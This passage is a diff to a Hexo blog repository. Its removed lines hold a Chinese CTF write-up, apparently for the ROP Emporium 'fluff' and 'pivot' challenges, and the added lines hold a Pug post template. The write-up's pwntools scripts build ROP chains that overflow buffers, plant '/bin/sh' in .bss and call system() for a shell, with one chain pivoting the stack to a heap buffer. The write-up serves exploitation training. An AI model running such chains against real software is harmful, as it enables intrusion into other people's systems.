p64(xorvalue)</span><br><span class="line">	payload += p64(bss_addr + i)			<span class="comment">#be careful!!!</span></span><br><span class="line">	payload += p64(xor_r15_r14_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#breakpoint = 0x4009DE</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid ==&gt;'</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x06-fluff"><a href="#0x06-fluff" class="headerlink" title="0x06 fluff"></a>0x06 fluff</h3><pre><code>**Idea:**
-
-有时候，仔细地查看汇编代码，运用一些工具。会发现一些很有趣的rop。
-</code></pre><p>比如 xx xor 0 == xx。</p>
-<h2 id="fluff-32bit"><a href="#fluff-32bit" class="headerlink" title="fluff 32bit"></a>fluff 32bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./fluff32'</span>)</span><br><span class="line">p = process(<span class="string">'./fluff32'</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A040</span></span><br><span class="line">system_addr = <span class="number">0x8048430</span></span><br><span class="line"><span class="comment">#*****************ROPgadget***********************</span></span><br><span class="line">pop_ebx = <span class="number">0x8048696</span></span><br><span class="line">xor_edx_edx = <span class="number">0x8048671</span></span><br><span class="line">xor_edx_ebx = <span class="number">0x804867b</span></span><br><span class="line">xchg_ecx_edx = <span class="number">0x8048689</span></span><br><span class="line">mov_ecx_edx = <span class="number">0x8048693</span></span><br><span class="line"></span><br><span class="line">pad = <span class="string">"aaaa"</span></span><br><span class="line">binsh = <span class="string">"sh\x00\x00"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#take bss to ecx</span></span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(xor_edx_edx)</span><br><span class="line">payload += pad</span><br><span class="line">payload += p32(xor_edx_ebx)</span><br><span class="line">payload += pad</span><br><span class="line">payload += p32(xchg_ecx_edx)</span><br><span class="line">payload += pad</span><br><span class="line"></span><br><span class="line"><span class="comment">#take binsh to edx</span></span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += binsh</span><br><span class="line">payload += p32(xor_edx_edx)</span><br><span class="line">payload += pad</span><br><span class="line">payload += p32(xor_edx_ebx)</span><br><span class="line">payload += pad</span><br><span class="line"></span><br><span class="line"><span class="comment">#take binsh to ecx</span></span><br><span class="line">payload += p32(mov_ecx_edx)</span><br><span class="line">payload += pad</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#ebx = 0 , disable the xor [ecx], ebx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += pad</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="comment">#breakpoint 0x0804864B</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid ==&gt;'</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="fluff-64bit"><a href="#fluff-64bit" class="headerlink" title="fluff 64bit"></a>fluff 64bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./fluff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP chain</span></span><br><span class="line">pop_r12_ret = <span class="number">0x400832</span></span><br><span class="line">xor_r11_ret = <span class="number">0x400822</span></span><br><span class="line">xor_r11_r12 = <span class="number">0x40082F</span></span><br><span class="line">xchg_r10_r11 = <span class="number">0x400840</span></span><br><span class="line">xor_r10_r12 = <span class="number">0x400855</span></span><br><span class="line">mov_r10_r11 = <span class="number">0x40084E</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008c3</span></span><br><span class="line"></span><br><span class="line">pop_r12_xor = <span class="number">0x400853</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line">system_addr = <span class="number">0x4005E0</span></span><br><span class="line">binsh = <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write .bss to r10</span></span><br><span class="line">payload1 += p64(pop_r12_ret)</span><br><span class="line">payload1 += p64(bss_addr)</span><br><span class="line">payload1 += p64(xor_r11_ret) </span><br><span class="line">payload1 += p64(<span class="number">14</span>)</span><br><span class="line">payload1 += p64(xor_r11_r12) </span><br><span class="line">payload1 += binsh</span><br><span class="line">payload1 += p64(xchg_r10_r11) </span><br><span class="line">payload1 += p64(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[r10] = 0</span></span><br><span class="line"><span class="comment">#r[10] = '/bin/sh\x00'</span></span><br><span class="line">payload1 += p64(xor_r11_ret)</span><br><span class="line">payload1 += p64(<span class="number">14</span>)</span><br><span class="line">payload1 += p64(mov_r10_r11)</span><br><span class="line">payload1 += p64(<span class="number">13</span>)</span><br><span class="line">payload1 += binsh</span><br><span class="line">payload1 += p64(xor_r11_ret)</span><br><span class="line">payload1 += p64(<span class="number">14</span>)</span><br><span class="line">payload1 += p64(xor_r11_r12) </span><br><span class="line">payload1 += binsh</span><br><span class="line">payload1 += p64(mov_r10_r11)</span><br><span class="line">payload1 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 += p64(pop_rdi_ret)</span><br><span class="line">payload1 += p64(bss_addr)</span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x07-pivot"><a href="#0x07-pivot" class="headerlink" title="0x07 pivot"></a>0x07 pivot</h3><pre><code>**Idea:**
-
-这次，fgets只允许我们读进有限的字符（没法布置足够长的payload在栈区执行），但是提供了另一个缓冲区的地址，这个缓冲区位于堆（heap）。通过寻找有用的ROP，我们可以巧妙地将payload布置在heap上，执行。
-</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pivot32'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pivot32'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libpivot32.so'</span>)</span><br><span class="line"></span><br><span class="line">foot_func_plt = elf.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">foot_func_got = elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#The two function offset in libcso</span></span><br><span class="line">ret2win_offset_foot = <span class="number">0x967</span> - <span class="number">0x770</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#***************ROPgadgets******************</span></span><br><span class="line">pop_eax = <span class="number">0x80488c0</span></span><br><span class="line">pop_ebx = <span class="number">0x8048946</span></span><br><span class="line">xchg_eax_esp = <span class="number">0x80488c2</span></span><br><span class="line">mov_eax_eax = <span class="number">0x80488c4</span></span><br><span class="line">add_eax_ebx = <span class="number">0x80488c7</span></span><br><span class="line">call_eax = <span class="number">0x080486a3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'The Old Gods kindly bestow upon you a place to pivot: '</span>)</span><br><span class="line">buffer_addr = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ropgadget = p32(foot_func_plt)</span><br><span class="line">ropgadget += p32(pop_eax)</span><br><span class="line">ropgadget += p32(foot_func_got)</span><br><span class="line">ropgadget += p32(mov_eax_eax)</span><br><span class="line">ropgadget += p32(pop_ebx)</span><br><span class="line">ropgadget += p32(ret2win_offset_foot)</span><br><span class="line">ropgadget += p32(add_eax_ebx)</span><br><span class="line">ropgadget += p32(call_eax)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Send your second chain now and it will land there\n&gt; '</span>)</span><br><span class="line">p.sendline(ropgadget)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(buffer_addr)</span><br><span class="line">payload += p32(xchg_eax_esp)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、32和64的程序，区别开来。传参方式，甚至还有x64的地址很可能存在\x00截断。</p>
-<p>2、环境。之前用的ubuntu18.04，自己所有的x64的exp都不起作用，存在”在调用c运行库时找不到文件的问题”，索性换了ubuntu14.04。</p>
-<p>3、GDB调试利器，加上peda真的好用。</p>
-<h2 id="立flag"><a href="#立flag" class="headerlink" title="立flag"></a>立flag</h2><p>1、学习格式化字符串漏洞的原理与利用</p>
-<p>2、熟练gdb调试程序</p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn/">pwn</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
